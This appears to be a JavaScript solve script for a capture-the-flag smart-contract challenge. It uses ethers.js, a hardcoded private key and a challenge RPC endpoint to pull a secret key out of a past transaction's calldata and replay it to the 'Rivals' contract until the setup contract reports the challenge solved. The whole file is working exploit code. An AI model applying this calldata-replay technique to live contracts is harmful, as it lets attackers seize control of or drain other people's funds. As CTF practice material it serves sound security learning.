const ethers = require("ethers");
const provider = new ethers.providers.JsonRpcProvider("http://157.245.39.76:32258/rpc");
const xorCrypt = require('xor-crypt');

const wallet = new ethers.Wallet("0x2c6b5ef3136769dccf8c7208c7ca273de87f4b5de7f1c11af439e1447f984dfb")
const signer = wallet.connect(provider);

let RIVALS_ADDR = "0xF01668c55578D9af639482d738FDc7D3e9C1F6e6";
let RIVALS_ABI = [
	{
		"inputs": [
			{
				"internalType": "bytes32",
				"name": "_encrypted",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "_hashed",
				"type": "bytes32"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "uint256",
				"name": "severity",
				"type": "uint256"
			}
		],
		"name": "Voice",
		"type": "event"
	},
	{
		"inputs": [],
		"name": "solver",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "bytes32",
				"name": "_key",
				"type": "bytes32"
			}
		],
		"name": "talk",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

let SETUP_ADDR = "0xe51a4a0FbF535D1C4606a6A61709734a0F3f2b33";
let SETUP_ABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_player",
				"type": "address"
			}
		],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_player",
				"type": "address"
			}
		],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]

const main = async() => {
    let contractSetup = new ethers.Contract(SETUP_ADDR, SETUP_ABI, provider);
    console.log(await contractSetup.isSolved(wallet.address));

    let contractRivals = new ethers.Contract(RIVALS_ADDR, RIVALS_ABI, provider);
    let txSigner = contractRivals.connect(signer);
    
    let rest = await contractRivals.filters.Voice(5);
    let txx = (await contractRivals.queryFilter(rest))[0].transactionHash;
    
    let tx = await provider.getTransaction(txx);
    const iface = new ethers.utils.Interface(RIVALS_ABI);
    let decodedData = iface.parseTransaction({ data: tx.data, value: tx.value });
    
    let key = decodedData.args[0];

    await txSigner.talk(key);

    console.log(await contractSetup.isSolved(wallet.address));
}

main();